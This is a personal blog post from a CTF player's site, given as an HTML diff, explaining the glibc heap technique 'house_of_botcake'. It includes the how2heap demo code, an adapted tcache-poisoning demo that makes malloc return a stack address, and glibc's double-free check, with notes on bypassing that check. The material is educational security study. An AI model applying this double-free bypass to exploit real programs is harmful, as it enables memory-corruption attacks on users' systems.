@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>house_of_botcake - Jsjsj</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="house_of_botcake - Jsjsj" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://jsjsj.top/2022/10/01/house-of-botcake/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2022-10-01T14:11:32.000Z" />
+  
+  <meta property="og:article:author" content="Mr. Jsjsj" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+    <body
+        data-color-scheme="dark"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/jsjsj1" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/pwn/">pwn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>October</span>
+            <span>1,</span>
+            <span>2022</span>
+        </div>
+        
+
+        <h2 class="title">house_of_botcake</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="PWN-house-of-botcake"><a href="#PWN-house-of-botcake" class="headerlink" title="PWN house_of_botcake"></a>PWN house_of_botcake</h1><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h1><p>In the DASCTF October competition, there was an inspection of house_of_botcake. I thought it was very strange at the time. I had never used this method before, so I went to how2heap to learn it. It was actually very simple, not as complicated as I imagined.</p>
+<p>Let’s rely on the source code analysis wave</p>
+<p>house_of_botcake.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating a chunk for later consolidation: prev @ %p\n&quot;</span>, prev);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk: a @ %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we have the chunk overlapping primitive:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="type">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev @ %p, size: %#x, end @ %p\n&quot;</span>, prev, prev_size, (<span class="type">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim @ %p, size: %#x, end @ %p\n&quot;</span>, a, a_size, (<span class="type">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>According to the adaptation demo of a master on the Internet:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//padding chunk or will double free</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in tcache</span></span><br><span class="line">    <span class="type">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    b[<span class="number">0x90</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = (<span class="type">size_t</span>)((<span class="type">long</span>)stack_var ^ ((<span class="type">long</span>)a &gt;&gt; <span class="number">12</span>));<span class="comment">// poison tcache</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    assert(c == stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>C demo idea: first apply for 7 chunks to fill up tc, then apply for 2 chunks for triggering, and a chunk for isolating the top to prevent overwriting the top chunk</p>
+<p>  Then free the first 7 chunks in turn, enter tc, free a chunk again, enter the unsorted bin, and then free a chunk in front of the unsort bin, which will be merged and merged.</p>
+<p>Apply for a chunk again. At this time, it will be applied from tc. After the application is released, tc will be reduced from 7 to 6. At this time, you will free the chunk that has just entered the unsortbin and enter tc. At this time, you can use the bypass key. In fact, this method It is to let the chunk enter the unsortbin first, and then let the unsortbin chunk enter the tc, so that the tc key can be bypassed, and the following can be arbitrarily written and hijacked</p>
+<p>tchace key source code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">  <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">     trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">     2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">     coincidence before aborting.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_entry *tmp;</span><br><span class="line">      LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">      <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">       tmp;</span><br><span class="line">       tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">      <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">         few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>If a chunk is freed into tc, it will detect the value of the key. If it is the same, it will traverse and detect the same address. If there is the same address, it will trigger double free. At this time, we can let it enter the unsortbin first. At this time, the value of the key is not equal. , and then arbitrarily hijacking double free will not report the error “free(): double free detected in tcache 2”. At this time, other methods are used, such as: off-by-one&#x2F;null heap overflow or UAF coverage bk reaches any hijacked operation<br>The final effect:<br>![730JX508C])$FK@THV85]IK.png]<a target="_blank" rel="noopener" href="http://azly.top/usr/uploads/2022/10/769705769.png">1</a></p>
+<p>Summary: I am preparing for the provincial competition recently, and I have read very little knowledge about pwn, woohoo, after the provincial competition, I will all devote myself to PWN, NO PWN NO FUN!!!!!</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Mr. Jsjsj, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/pwn/" class="tag">#pwn</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2022/10/03/2022%20Strong%20Network%20Mimic%20CTF%20PWN%20writeup/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">2022 Strong Network Mimic CTF PWN writeup</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2022/08/03/PWN%20IOfile%20simple%20record/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">PWN IOfile simple record</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="MrWillCom/MrWillCom.github.io" data-repo-id="MDEwOlJlcG9zaXRvcnkyODg5NTc5MTA=" data-category="Announcements" data-category-id="DIC_kwDOETkl1s4COQZm" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/projects" class="item">Projects</a>
+                
+                <a href="/resume" class="item">Resume</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/jsjsj1" class="item">GitHub</a>
+                
+                <a href="904815041@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Mr. Jsjsj<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+         
+        
+<script src="//code.tidio.co/6bkvqlfpdbtihnufei8yxpsvf98bq5gv.js"></script>
+ 
+        
+<script src="/js/tidio.js"></script>
+
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
